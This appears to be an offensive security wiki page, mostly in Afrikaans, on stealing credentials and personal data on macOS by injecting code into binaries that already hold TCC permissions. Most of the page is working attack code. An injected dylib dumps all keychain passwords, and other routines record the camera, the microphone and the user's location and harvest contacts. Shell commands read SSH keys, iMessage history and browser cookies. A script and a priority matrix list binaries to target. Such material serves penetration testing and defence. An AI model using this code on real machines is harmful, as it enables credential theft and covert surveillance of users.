# macOS Credential- en Data Theft via TCC Permissions

{{#include ../../../../banners/hacktricks-training.md}}

## Oorsig

macOS TCC (Transparency, Consent, and Control) beskerm toegang tot sensitiewe gebruikerdata. Wanneer 'n aanvaller **'n binary kompromitteer wat reeds TCC grants het**, erf hulle daardie permissions. Hierdie bladsy dokumenteer die exploitation potential van elke data-theft-related TCC permission.

> [!WARNING]
> Code injection into a TCC-granted binary (via DYLD injection, dylib hijacking, or task port) **silently inherits all its TCC permissions**. Daar is geen addisionele prompt of verification wanneer dieselfde proses beskermde data lees nie.

---

## Keychain Access Groups

### Die Buit

Die macOS Keychain stoor:
- **Wi-Fi-wagwoorde** — alle gestoorde wireless network credentials
- **Website-wagwoorde** — Safari-, Chrome- (wanneer Keychain gebruik word) en ander browser-wagwoorde
- **Application-wagwoorde** — e-posrekeninge, VPN-credentials, development tokens
- **Certificates and private keys** — code signing, client TLS, S/MIME encryption
- **Secure notes** — geheime wat deur die gebruiker gestoor is

### Entitlement: `keychain-access-groups`

Keychain-items word in **access groups** georganiseer. 'n Toepassing se `keychain-access-groups` entitlement lys watter groepe dit kan access:
```xml
<key>keychain-access-groups</key>
<array>
<string>com.apple.cfnetwork</string>   <!-- Network passwords -->
<string>com.apple.security.personal-information.identity</string>  <!-- Personal certs -->
<string>apple</string>                  <!-- Broad Apple group -->
<string>InternetAccounts</string>       <!-- Internet account passwords -->
</array>
```
### Eksploitasie
```bash
# Find binaries with broad keychain access groups
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND isAppleBin = 0
ORDER BY privileged DESC;"

# If you can inject into such a binary, enumerate keychain items:
security dump-keychain -d ~/Library/Keychains/login.keychain-db 2>&1 | head -100

# Find specific passwords
security find-generic-password -s "Wi-Fi" -w 2>&1
security find-internet-password -s "github.com" 2>&1
```
### Code Injection → Keychain-diefstal
```objc
// Injected dylib code — runs with the target's keychain groups
#import <Security/Security.h>

__attribute__((constructor))
void dumpKeychain(void) {
NSDictionary *query = @{
(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnAttributes: @YES,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecMatchLimit: (__bridge id)kSecMatchLimitAll
};

CFArrayRef results = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, (CFTypeRef *)&results);

if (status == errSecSuccess) {
NSArray *items = (__bridge NSArray *)results;
for (NSDictionary *item in items) {
NSString *service = item[(__bridge id)kSecAttrService];
NSString *account = item[(__bridge id)kSecAttrAccount];
NSData *passData = item[(__bridge id)kSecValueData];
NSString *password = [[NSString alloc] initWithData:passData encoding:NSUTF8StringEncoding];
// service, account, password — the full credential triple
}
}
}
```
---

## Kameratoegang (kTCCServiceCamera)

### Exploitation

'n binary met 'n camera-TCC-toestemming (via `kTCCServiceCamera` of die `com.apple.security.device.camera` entitlement) kan foto's en video vaslê:
```bash
# Find camera-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceCamera' AND auth_value=2;"
```
### Stil Vaslegging
```objc
// Injected into a camera-entitled process
#import <AVFoundation/AVFoundation.h>

@interface SilentCapture : NSObject <AVCaptureVideoDataOutputSampleBufferDelegate>
@property (strong) AVCaptureSession *session;
@end

@implementation SilentCapture
- (void)startCapture {
self.session = [[AVCaptureSession alloc] init];
AVCaptureDevice *camera = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:camera error:nil];
[self.session addInput:input];

AVCaptureVideoDataOutput *output = [[AVCaptureVideoDataOutput alloc] init];
[output setSampleBufferDelegate:self queue:dispatch_get_global_queue(0, 0)];
[self.session addOutput:output];

[self.session startRunning];
// Camera LED turns on — but a brief capture may go unnoticed
}

- (void)captureOutput:(AVCaptureOutput *)output
didOutputSampleBuffer:(CMSampleBufferRef)sampleBuffer
fromConnection:(AVCaptureConnection *)connection {
// Each frame can be saved to disk or exfiltrated
// Stop after capturing a few frames to minimize LED time
[self.session stopRunning];
}
@end
```
> [!TIP]
> Vanaf **macOS Sonoma** is die kamera-aanwyser in die kieslysbalk permanent en kan dit nie programmaties versteek word nie. Op **ouer macOS-weergawes** sal ’n kort opname moontlik nie ’n merkbare aanwyser vertoon nie.

---

## Mikrofoontoegang (kTCCServiceMicrophone)

### Exploitation

Mikrofoontoegang neem alle klank vanaf die ingeboude mikrofoon, headset of gekoppelde klankinvoertoestelle op:
```bash
# Find mic-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceMicrophone' AND auth_value=2;"
```
### Aanval: Ambient Recording
```objc
// Injected into a mic-entitled process
#import <AVFoundation/AVFoundation.h>

- (void)recordAudio {
NSURL *url = [NSURL fileURLWithPath:@"/tmp/recording.m4a"];
NSDictionary *settings = @{
AVFormatIDKey: @(kAudioFormatMPEG4AAC),
AVSampleRateKey: @44100.0,
AVNumberOfChannelsKey: @1
};
AVAudioRecorder *recorder = [[AVAudioRecorder alloc] initWithURL:url settings:settings error:nil];
[recorder record];
// Records everything: conversations, phone calls, ambient audio

// Stop after a duration
dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 60 * NSEC_PER_SEC),
dispatch_get_main_queue(), ^{
[recorder stop];
// Exfiltrate /tmp/recording.m4a
});
}
```
---

## Liggingopsporing (kTCCServiceLocation)

### Uitbuiting
```bash
# Find location-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service LIKE '%Location%' AND auth_value=2;"
```
### Deurlopende Nasporing
```objc
#import <CoreLocation/CoreLocation.h>

@interface Tracker : NSObject <CLLocationManagerDelegate>
@end

@implementation Tracker
- (void)startTracking {
CLLocationManager *mgr = [[CLLocationManager alloc] init];
mgr.delegate = self;
mgr.desiredAccuracy = kCLLocationAccuracyBest;
[mgr startUpdatingLocation];
}

- (void)locationManager:(CLLocationManager *)manager
didUpdateLocations:(NSArray<CLLocation *> *)locations {
CLLocation *loc = locations.lastObject;
// loc.coordinate.latitude, loc.coordinate.longitude
// Reveals: home address, work address, travel patterns, daily routine
NSString *entry = [NSString stringWithFormat:@"%f,%f,%@\n",
loc.coordinate.latitude, loc.coordinate.longitude, [NSDate date]];
// Append to tracking log
}
@end
```
---

## Kontakte / Kalender / Foto's

### Eksfiltrasie van persoonlike data

| TCC-diens | Framework | Data |
|---|---|---|
| `kTCCServiceAddressBook` | `Contacts.framework` | Name, e-posadresse, telefoonnommers, adresse |
| `kTCCServiceCalendar` | `EventKit` | Vergaderings, deelnemers, liggings |
| `kTCCServicePhotos` | `Photos.framework` | Foto's, skermkiekies, liggingmetadata |
```bash
# Find authorized binaries for each service
for svc in kTCCServiceAddressBook kTCCServiceCalendar kTCCServicePhotos; do
echo "=== $svc ==="
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='$svc' AND auth_value=2;"
done
```
### Kontakte insamel
```objc
#import <Contacts/Contacts.h>

CNContactStore *store = [[CNContactStore alloc] init];
NSArray *keys = @[CNContactGivenNameKey, CNContactFamilyNameKey,
CNContactEmailAddressesKey, CNContactPhoneNumbersKey];
CNContactFetchRequest *request = [[CNContactFetchRequest alloc] initWithKeysToFetch:keys];

[store enumerateContactsWithFetchRequest:request error:nil
usingBlock:^(CNContact *contact, BOOL *stop) {
// contact.givenName, contact.familyName
// contact.emailAddresses, contact.phoneNumbers
// All contacts exfiltrated for social engineering / spear phishing
}];
```
---

## iCloud Account Access

### Entitlement: `com.apple.private.icloud-account-access`

Hierdie entitlement laat kommunikasie met die `com.apple.iCloudHelper` XPC service toe, wat toegang verskaf tot:
- **iCloud tokens** — authentication tokens vir die gebruiker se Apple ID
- **iCloud Drive** — gesinkroniseerde dokumente vanaf alle toestelle
- **iCloud Keychain** — passwords wat oor alle Apple-toestelle gesinkroniseer word
- **Find My** — ligging van al die gebruiker se Apple-toestelle<sup>[4]</sup>
```bash
# Find iCloud-entitled binaries
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE iCloudAccs = 1
ORDER BY privileged DESC;"
```
> [!CAUTION]
> Die kompromittering van ’n iCloud-entitled binary brei die aanval uit van ’n **enkele toestel na die hele Apple-ekosisteem**: ander Macs, iPhones, iPads en Apple Watch. iCloud Keychain-sinchronisering beteken dat wagwoorde vanaf alle toestelle toeganklik is.

---

## Volle skyftoegang (kTCCServiceSystemPolicyAllFiles)

### Die kragtigste TCC-toestemming

Volle skyftoegang verleen leesvermoë tot **elke lêer op die stelsel**, insluitend:
- Data van ander apps (Messages, Mail, Safari-geskiedenis)
- TCC-databasisse (wat alle ander toestemmings onthul)
- SSH-sleutels en -konfigurasie
- Browserkoekies en sessietokens
- Toepassingsdatabasisse en caches
```bash
# Find FDA-granted binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceSystemPolicyAllFiles' AND auth_value=2;"

# With FDA, read anything:
cat ~/Library/Messages/chat.db              # iMessage history
cat ~/Library/Safari/History.db             # Safari browsing history
cat ~/Library/Cookies/Cookies.binarycookies # Browser cookies
cat ~/.ssh/id_rsa                           # SSH private key
```
---

## Exploitation-prioriteitsmatriks

Wanneer jy injectable TCC-granted binaries assesseer, prioritiseer volgens datawaarde:

| Prioriteit | TCC Permission | Waarom |
|---|---|---|
| **Critical** | Full Disk Access | Toegang tot alles |
| **Critical** | TCC Manager | Kan enige permission toestaan |
| **High** | Keychain Access Groups | Alle gestoorde wagwoorde |
| **High** | iCloud Account Access | Multi-device compromise |
| **High** | Input Monitoring (ListenEvent) | Keylogging |
| **High** | Accessibility | GUI-beheer, self-toestemming |
| **Medium** | Screen Capture | Visuele data-opname |
| **Medium** | Camera + Microphone | Surveillance |
| **Medium** | Contacts + Calendar | Data vir social engineering |
| **Low** | Location | Fisiese opsporing |
| **Low** | Photos | Persoonlike data |

## Enumeration Script
```bash
#!/bin/bash
echo "=== TCC Credential Theft Surface Audit ==="

echo -e "\n[*] High-value TCC grants (injectable binaries):"
sqlite3 /tmp/executables.db "
SELECT path, tccPermsStr FROM executables
WHERE (noLibVal = 1 OR allowDyldEnv = 1)
AND tccPermsStr IS NOT NULL
AND tccPermsStr != ''
ORDER BY privileged DESC
LIMIT 30;" 2>/dev/null

echo -e "\n[*] Keychain-entitled injectable binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND (noLibVal = 1 OR allowDyldEnv = 1);" 2>/dev/null

echo -e "\n[*] iCloud-entitled binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE iCloudAccs = 1;" 2>/dev/null
```
## Verwysings

- [1] [Apple Developer — Keychain Services](https://developer.apple.com/documentation/security/keychain_services)
- [2] [Apple Developer — TCC](https://developer.apple.com/documentation/security/protecting-the-user-s-privacy)
- [3] [Objective-See — TCC Exploitation](https://objective-see.org/blog/blog_0x4C.html)
- [4] [OBTS v5.0 — "What Happens on your Mac, Stays on Apple's iCloud?!" (Wojciech Regula)](https://www.youtube.com/watch?v=_6e2LhmxVc0)

{{#include ../../../../banners/hacktricks-training.md}}
